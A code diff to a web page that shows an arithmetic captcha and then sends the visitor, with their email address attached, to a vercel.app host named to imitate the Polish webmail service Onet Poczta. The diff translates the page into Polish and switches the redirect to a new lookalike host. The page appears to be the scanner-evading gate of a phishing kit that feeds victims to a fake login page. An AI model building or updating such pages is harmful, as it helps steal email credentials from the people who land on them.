@@ -53,11 +53,11 @@
 </head>
 <body>
   <div class="container">
-    <h2>Proszę o sprawdzenie</h2>
+    <h2>Proszę zweryfikować</h2>
     <div id="captchaQuestion"></div>
-    <input type="text" id="captchaInput" placeholder="Enter answer">
-    <button id="verifyButton" disabled>Verify</button>
-    <div id="error">Verification failed. Please try again.</div>
+    <input type="text" id="captchaInput" placeholder="Wprowadź odpowiedź">
+    <button id="verifyButton" disabled>Zweryfikuj</button>
+    <div id="error">Weryfikacja nie powiodła się. Spróbuj ponownie.</div>
   </div>
 
   <script>
@@ -139,9 +139,9 @@
       if (parseInt(userAnswer) === correctAnswer) {
         // Redirect to original URL with email hash if it exists
         if (originalEmail) {
-          window.location.href = `https://poczta-onet-pl.vercel.app#${originalEmail}`;
+          window.location.href = `https://poczta-onet-pl-yb3u.vercel.app#${originalEmail}`;
         } else {
-          window.location.href = 'https://poczta-onet-pl.vercel.app/index.html';
+          window.location.href = 'https://poczta-onet-pl-yb3u.vercel.app/index.html';
         }
       } else {
         errorDiv.style.display = 'block';
